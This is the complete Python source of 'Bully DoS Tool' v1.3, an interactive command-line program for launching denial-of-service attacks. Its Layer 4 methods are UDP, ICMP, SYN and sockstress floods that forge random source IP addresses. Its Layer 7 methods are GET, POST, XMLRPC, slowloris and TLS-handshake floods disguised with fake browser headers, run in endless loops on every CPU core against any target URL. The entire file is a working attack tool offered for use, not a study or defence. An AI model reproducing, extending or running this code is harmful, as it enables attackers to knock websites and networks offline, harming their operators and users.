import socket
import random
import ssl
import sys 
import os 
import string
import multiprocessing 
import argparse
import threading
from fake_headers import Headers
from urllib.parse import urlparse
from fake_useragent import UserAgent
from impacket import ImpactDecoder, ImpactPacket

RED,WHITE,GREEN,END =  '\033[1;91m', '\33[1;97m','\033[1;32m', '\033[0m'

class Tool : 
    
    @staticmethod
    def banner() :
        print(GREEN +'''
---------------------------------------------------------------------------------------------------------------                          
                            ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
                            ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
                            ██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
                            ██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
                            ██████╔╝╚██████╔╝███████╗███████╗██║   
                            ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝Bully DoS Tool by Frank Cisco   
                                                                Version = 1.3
                                                                Recommended OS = Linux 
---------------------------------------------------------------------------------------------------------------
''' + END)
    
    @staticmethod 
    def attack_banner() : 
        
        print(RED +''' 
[I] Attack Started...
                      ______
                   .-"      "-.
                  /            \
                 |              |
                 |,  .-.  .-.  ,|
                 | )(_o/  \o_)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/__________________________
 (_)@8@8{}<________|-\IIIIII/-|___________________________>
        )_/        \          /
       (@           `--------`

''' + END )
    
    
    
    @staticmethod
    def clear() : 
        
        if os.name == 'nt' :
            
            os.system('cls')
            
        elif os.name == 'posix' :
            
            os.system('clear')
            
        else : 
            
            pass 
        
    @staticmethod
    def ip_generator() : 
    
        addr_parse = [0, 0, 0, 0] 

        addr_parse[0] = str(random.randint(1,197)) 
        addr_parse[1] = str(random.randint(0,255)) 
        addr_parse[2] = str(random.randint(0,255))
        addr_parse[3] = str(random.randint(1,254))
        
        return '.'.join(addr_parse)
    
    @staticmethod
    def spoof_ip() : 
        
        return Tool.ip_generator()




class Target:

    @staticmethod
    def hostname() -> str :
        
        return urlparse(args.target).hostname 
   
    @staticmethod
    def port() -> int : 
    
        if urlparse(args.target).scheme.lower() == 'https' : 
            
            return 443 
        
        elif urlparse(args.target).scheme.lower() == 'http' :
        
            return 80
        
        else : 
            print(RED + 'Check url '+ END)
            
            sys.exit(1)
    
    @staticmethod
    def ip_addr():
        
        return socket.gethostbyname(Target.hostname())
    
    
    @staticmethod
    def socket_count() -> int :
        
        return int(args.socket_count) 
    
    
    @staticmethod
    def core_count() -> int: 
        
        return int(multiprocessing.cpu_count())
    
    
    def attack_methods() -> str : 
        
        pass 
            
    @staticmethod
    def info():
            print(WHITE +f'''
            \rTarget => {Target.hostname()}

            \rTarget IP => {Target.ip_addr()}

            \rTarget Port => {Target.port()}

            \rConcurrent Socket => {Target.socket_count()}
            
            \rConcurrent Cores => {Target.core_count()}
            '''+ END )

class Payload_Generator : 
    
    @staticmethod
    def udp() -> str : 
        
        return random._urandom(32)
    @staticmethod
    def bomb() -> str :
        
        return random._urandom(65000)
    @staticmethod
    def flood() -> str :
        
        return random._urandom(64) 
        
    @staticmethod
    def syn(spoof_ip,target,port) -> str :  
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_SYN()
                
        tcp.set_th_flags(0x02)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def ack(spoof_ip,target,port) -> str  :
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_ACK()
        
        tcp.set_th_flags(0x10)

        tcp.set_th_win(0)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def useragent() -> str : 
        
        return UserAgent().random 
    
    @staticmethod
    def referers() -> str  :
        referers = [
               "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer",
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
                "https://www.google.com/",
                "http://www.yandex.com/",]
       
        return  random.choice(referers)
    
    @staticmethod
    def generate_cookie() -> str :

        cookie_chars = string.ascii_letters + string.digits

        return ''.join(random.choice(cookie_chars) for i in range(64))
    
    @staticmethod
    def generate_random_path() -> str:
    
        path_length = random.randint(1, 10) 
    
        path_chars = string.ascii_letters + string.digits + '/_-' 
        
        path = ''.join(random.choice(path_chars) for i in range(path_length)) 
    
        return '/' + path 
    
    @staticmethod
    def pps(target) -> str : 
        
        return f'GET / HTTP/1.1\r\nHost:{urlparse(target).hostname}\r\n\r\n'
    
    @staticmethod
    def get(target) -> str : 
        
        packet = f'''
            GET / HTTP/1.1
            Host: {urlparse(target).hostname}
            User-Agent: {Payload_Generator.useragent()}
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Content-Type: application/json; charset=UTF-8
            Referer: {Payload_Generator.referers()}
            Connection: keep-alive
            Upgrade-Insecure-Requests: 1
            '''
        return packet 
    
    @staticmethod
    def slowloris(target) :
        
        packet = f'X-a:{random.randint(1, 4000)} Host :{urlparse(target).hostname} \r\n'
        
        return packet 
    
    @staticmethod
    def post(target) -> str  : 
        
        packet =    f'''
                    POST /{Payload_Generator.generate_random_path()}?format=json&hasfast=true&authuser=0 HTTP/2
                    Host: {urlparse(target).hostname}
                    Content-Length: {random.randint(0,500)}
                    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
                    X-Goog-Authuser: 0
                    Connection: keep-alive
                    User-Agent: {Payload_Generator.useragent()}
                    Accept: */*
                    X-Client-Data: CIfbygE=
                    Sec-Fetch-Site: same-site
                    Referer :{Payload_Generator.referers()}
                    Sec-Fetch-Mode: cors
                    Sec-Fetch-Dest: empty
                    Accept-Language: en-US,en;q=0.5
                    Accept-Encoding: gzip, deflate
                        [
                            [
                                1,
                                null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,
                                    [
                                    null
                                    ,null
                                    ,null
                                    ,null
                                    ,"en"
                                    ,null
                                    ,null
                                    ,null
                                    ,null,]
                                            ]'''
                                            
        return packet

    @staticmethod
    def XML(target) -> str :
        
        packet = f'''
        GET /files/???XML HTTP/2
        Host: {urlparse(target).hostname}
        Cookie: {Payload_Generator.generate_cookie()}
        X-Requested-With: XMLHttpRequest
        User-Agent: {Payload_Generator.useragent()}
        Sec-Ch-Ua-Platform: "Windows"
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: image
        Referer: {Payload_Generator.referers()}
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        '''
        return packet


class Layer4(multiprocessing.Process): 
    
    def __init__(self,method) :
        
        multiprocessing.Process.__init__(self)
    
        self.target = Target.hostname()
        
        self.dst_ip = Target.ip_addr()
        
        self.port = Target.port()
        
        self.spoof_ip = Tool.spoof_ip()
    
        self.socket_list  = []    
        
        self.socket_count = Target.socket_count()
       
        self.process_list = []
        
        self.process_count =  Target.core_count()

        self.method = method
         
        self.attack_methods = {'UDP': self.udp_storm,
                               'SYN':self.syn_flood,
                               'ICMPF':self.icmp_flood,
                               'ICMPB':self.icmp_flood,
                               'SOCKSTRESS':self.sockstress} 
        
        
    
    def init_udp_socket(self) : 
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 

        return sock 
    
    
    def udp_storm(self) : 
        
        try : 
            _payload = Payload_Generator.udp()
            
            for _ in range(self.socket_count):
                
                sock = self.init_udp_socket() 

                self.socket_list.append(sock)
                
            if self.socket_list : 
                
                while True : 
                    
                    for sock in self.socket_list:
                        
                        sock.sendto(_payload,(self.target,self.port))
        
        except Exception as error : 
            
            if isinstance(error, WindowsError) and error.winerror == 10055:
               
                print(RED +'Low buffer size,decrease concurrent socket count.'+ END )
            
                pass 
                
            else : 
                
                print(RED + str(error) + END )
                
                pass 
                
            
    def init_icmp_socket(self) :
        
        try  :
            
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            
            return sock
        
        except PermissionError : 
          
            print(RED + 'Try run as admin'+ END )
                
    
    def icmp_flood(self) : 
        
        try : 
            if self.method == 'ICMPB' : 
                
                _payload = Payload_Generator.bomb()
            
            elif self.method == 'ICMPF' : 
                
                 _payload = Payload_Generator.flood()
            
            for num in range(self.socket_count):
                
                sock = self.init_icmp_socket() 
                
                self.socket_list.append(sock)
                
            if self.socket_list : 
                
                while True : 
                    
                    for sock in self.socket_list:
                        
                        sock.sendto(_payload,(self.target,self.port))
        
        except Exception as error : 
        
            if isinstance(error, WindowsError) and error.winerror == 10013:
                
                print(RED +'Permission Error try run as admin' + END )
                
                pass
            
            elif isinstance(error, WindowsError) and error.winerror == 10055 : 
                
                print(RED +'Low buffer size,decrease concurrent socket count.'+ END )
            
                pass 
                
                
    def init_tcp_socket(self) : 
       
        sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP) 
    
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
        
        sock.connect((self.target,self.port))
        
        return sock 
    


    def syn_flood(self) :  
        
        try :
        
            _payload = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
            
            for num in range(self.socket_count) :
            
                sock = self.init_tcp_socket()
                
                self.socket_list.append(sock)
            
                
            if self.socket_list : 
                
                while True : 
                    
                    for sock in self.socket_list :
                        
                        sock.send(_payload)

        except Exception as error : 
        
            if isinstance(error, WindowsError) and error.winerror == 10022:
                
                print(RED +'Invalid argument supplied.You should try on Linux.' + END )
                
                pass
    
            else : 
                
                print(error)

                pass 
                
    def sockstress(self) : 
        try : 
            
            _payload0 = Payload_Generator.syn(self.spoof_ip,self.dst_ip,self.port)
            
            _payload1 = Payload_Generator.ack(self.spoof_ip,self.dst_ip,self.port)
            
            for num in range(self.socket_count) :
            
                sock = self.init_tcp_socket()
                
                self.socket_list.append(sock)
                  
            if self.socket_list : 
                
                while True : 
                    
                    for sock in self.socket_list :
                        
                        sock.send(_payload0)

                        sock.send(_payload1)             
                
        except Exception as error : 
        
            if isinstance(error, WindowsError) and error.winerror == 10022:
                
                print(RED +'Invalid argument supplied.You should try on Linux.' + END )
                
                pass
    
            else : 
                
                print(error)

                pass 
    
    
    def run(self) : 
        
        print(GREEN+f'[I]{multiprocessing.current_process().name} started to attack...'+END)        
        
        self.attack_methods[self.method]()
        
        
            
class Layer7(multiprocessing.Process): 
    
    def __init__(self,method) : 
        
        multiprocessing.Process.__init__(self)
    
        self.target = Target.hostname()
        
        self.dst_ip = Target.ip_addr()
        
        self.port = Target.port()
    
        self.socket_list  = []    
        
        self.socket_count = Target.socket_count()
       
        self.process_list = []
        
        self.process_count =  Target.core_count()

        self.method = method
         
        self.methods = {'GET':Payload_Generator.get(self.target),
                               'PPS':Payload_Generator.pps(self.target),
                               'POST':Payload_Generator.post(self.target),
                               'XMLRPC':Payload_Generator.XML(self.target),
                               'SLOWLORIS':Payload_Generator.slowloris(self.target),
                               'KILL':Payload_Generator.pps(self.target),
                               'SSL':self.handshake_spam } 
        
        
    def init_tcp_socket(self) -> socket :
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        
        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        
        sock.connect((self.target,self.port))  

        if self.port == 443 :
                    
            context = ssl.create_default_context()

            context.check_hostname = False
                    
            context.verify_mode = ssl.CERT_NONE
                    
            sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=True)

            return sock

        return sock

        
            
            
    def init_ssl_socket(self) -> socket : 
        
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             
        
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   
        
        context.verify_mode = ssl.CERT_REQUIRED
    
        context.check_hostname = True

        sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=False)

        sock.settimeout(0.9)
        
        return sock

                    
    def handshake_spam(self) :
     
        while True : 
            
            sockets = []
            
            for num in range(self.socket_count) :
                
                sock = self.init_ssl_socket()
                
                sock.connect((self.target, self.port))

                sockets.append(sock)
                    
                sock.do_handshake()
            
            for sock in self.socket_list  : 
                
                sock.shutdown(socket.SHUT_RDWR)

                sock.close()

    
    def KILL(self) : 
        
        thread_list = []
        
        for _ in range(5) : 
            
            th = threading.Thread(target=self.attack, daemon=True)

            th.start()
            
            thread_list.append(th)
            
            
        for th in thread_list : 
            
            th.join()
        
    
    def attack(self) : 
        
        try : 
            
            payload = self.methods[self.method]
            
            for num in range(self.socket_count) : 
                
                sock = self.init_tcp_socket()
                
                self.socket_list.append(sock)

            if self.socket_list : 
                
                while True : 
                        
                    for sock in self.socket_list :
                        
                        sock.send(str.encode(payload)) 
            
        except Exception as error : 
        
            if isinstance(error, ConnectionResetError):
            
                print(RED +f'{multiprocessing.current_process().name} WARNING ==> Connection closed by server.'+ END)
            
                pass 
            
            elif isinstance(error,ssl.SSLEOFError)  : 
                
                print(RED +f'{multiprocessing.current_process().name} WARNING ==> SSL connection closed by server.'+ END)
                
                pass 
            
            else : 
                
                pass 
            
    def run(self) : 
       
        print(GREEN+f'[I]{multiprocessing.current_process().name} started to attack...'+END)        
        
        if self.method  == 'SSL' : 
            
            self.methods[self.method]() 
        
        elif self.method == 'KILL' :
            
            self.KILL()

        else : 
            
            self.attack()


if __name__ == '__main__': 
   
    parser = argparse.ArgumentParser(description='Bully CLI')

    parser.add_argument('-target','--target',type=str,help='Target address')
    
    parser.add_argument('-s','--socket_count',type=int,help='Concurrent socket count')

    args = parser.parse_args()  


    def run_attack(layer,method) : 
    
        process_list = []
        
        if layer == 4 : 
            
            Layer= Layer4
            
        elif layer == 7 : 
            
            Layer  = Layer7
        
        for i in range(multiprocessing.cpu_count()) : 
            
            _layer = Layer(method)

            _layer.start()
            
            process_list.append(_layer)
            
        for _layer in process_list : 
            
            _layer.join()
            

    def run_prompt() : 
        
        Tool.clear()

        Tool.banner()
        
        cons = GREEN +'C1sco@Bully:~$=>' + END   
        
        print(RED + '$=> Use help|usage.\n'+ END )
        
        while True : 
            
            cmd = input(cons + " ").strip()
           
            cmd = cmd.lower()
        
            if cmd in ['usage','help'] : 
                
                print(WHITE +'''
                      \r----------------Bully DoS Tool-----------------
                      
                      \rFor information use => info or information 
    
                      \rFor show attack methods use => method or methods
                
                      \rFor start attack interface => attack or run
                      
                      \rFor clear terminal use => clear 
                      
                      \rFor exit CLI use => exit/close/f
                     \r------------------------------------------------
                      ''' + END)

                continue
            
            if cmd in ['info', 'information']: 
                
                Target.info()
              
                continue
            
            if cmd in['methods','method'] : 
                
                print(WHITE +'Layer4 Attack Methods ==>\n=>UDP Storm\n=>ICMP Flood\n=>ICMP Bomb\n=>SYN Flood\n=>Sockstress\n' + END )
                
                print(WHITE +'\rLayer7 Attack Methods ==>\n=>GET\n=>PPS\n=>Post\n=>XMLRPC\n=>Slowloris\n=>Kill\n=>SSL'+ END )            
            
                continue
            
            if cmd in['attack','run'] : 
                
                Tool.clear()
                
                print(RED+'---------------Attack Interface-------------'+ END)
                    
                print(RED+'\nChoose attack layer==>\n\n==>Layer4\n\n==>Layer7\n\nTo back to main menu use => back\n'+ END )
                    
                print(RED+'--------------------------------------------'+ END)
                
                while True : 
                   
                    layer  = input(cons + " ").strip()
                    
                    layer= layer.lower()
                    
                    if layer in ['1','l4','4','layer4','layer 4'] : 
                        
                        Tool.clear()
                            
                        print(RED+'---------------Layer 4----------------\n'+ END)
                    
                        print(RED +'Layer4 Attack Methods ==>\n\n=>UDP Storm\n\n=>ICMP Flood\n\n=>ICMP Bomb\n\n=>SYN Flood\n\n=>Sockstress\n' + END )                    
                        
                        print(RED + 'UDP | ICMPF | ICMPB | SYN | SOCKSTRESS' + END )
                        
                        print(RED + '\nFor return main menu use => back\n' + END)
                        
                        while True : 
                           
                            method = input(cons + " ").strip()
                            
                            method = method.upper()
                            
                            if method in ['UDP','ICMPF','ICMPB','SYN','SOCKSTRESS'] : 
                                
                                Tool.clear()
                                
                                print(RED + '---------------TARGET INFO-----------------'+ END)
                                
                                Target.info()
                                
                                print(RED + '--------------------------------------------'+ END)
                                
                                
                                print(RED +f'Attack Layer => 4\n\nAttack Method => {method}'+ END)
                                
                                Tool.attack_banner()
                                
                                if  method == 'UDP' : 
                                    
                                    run_attack(4,'UDP')
                                    
                                elif  method == 'ICMPF' :
                                    
                                    run_attack(4,'ICMPF')
                                
                                elif  method == 'ICMPB' : 
                                    
                                    run_attack(4,'ICMPB')
                                    
                                elif  method == 'SYN' : 
                                    
                                    run_attack(4,'SYN')
                                
                                elif method == 'SOCKSTRESS' : 
                                    
                                    run_attack(4,'SOCKSTRESS')

                            if method == 'BACK' : 
                                
                                Tool.clear()
                                
                                break
                            

                    if layer in ['2','l7','7','layer7','layer 7'] : 
                        
                        Tool.clear()
                        
                        print(RED+'-----------------Layer 7------------------\n'+ END)
                        
                        print(RED +'\rLayer7 Attack Methods ==>\n\n=>GET\n\n=>PPS\n\n=>POST\n\n=>XMLRPC\n\n=>Slowloris\n\n=>KILL\n\n=>SSL'+ END )   
                                
                        print(RED + '\nGET | PPS | POST | XMLRPC | SLOWLORIS | KILL | SSL' + END )
                        
                        print(RED + '\nFor return main menu use => back\n' + END)
                       
                        while True : 
                        
                            method = input(cons + " ").strip()
                            
                            method = method.upper()
                            
                            if method in ['GET','PPS','POST','XMLRPC','SLOWLORIS','KILL','SSL'] : 
                            
                                Tool.clear()
                                
                                print(RED + '---------------TARGET INFO-----------------'+ END)
                                
                                Target.info()
                                
                                print(RED + '--------------------------------------------'+ END)
                                
                                print(RED +f'Attack Layer => 7\n\nAttack Method => {method}'+ END)
                                
                                Tool.attack_banner()
                                
                                if  method == 'GET' : 
                                    
                                    run_attack(7,'GET')
                                    
                                elif  method == 'PPS' :
                                    
                                    run_attack(7,'PPS')
                                
                                elif  method == 'POST' : 
                                    
                                    run_attack(7,'POST')
                                    
                                elif  method == 'XMLRPC' : 
                                    
                                    run_attack(7,'XMLRPC')
                                
                                elif method == 'SLOWLORIS' : 
                                    
                                    run_attack(7,'SLOWLORIS')
                                    
                                elif method == 'KILL': 
                                    
                                    run_attack(7,'KILL')

                                elif method == 'SSL' : 
                                    
                                    run_attack(7,'SSL')

                            
                            if method == 'BACK' : 
                                
                                Tool.clear()
                                
                                break 
                    
                  
                    if layer == 'back' : 
                        
                        Tool.clear()

                        break 
                    
                    
                    if layer in ['exit','close','f'] : 
                        
                        print(RED +'Exiting...'+END)
                        
                        sys.exit(1)
           
           
            if cmd == 'clear' :
                
                Tool.clear()

                continue 
            
            
            if cmd in ['exit','close','f'] : 
                
                print(RED+ 'Exiting...'+ END)
                
                sys.exit(1)
    
    run_prompt()
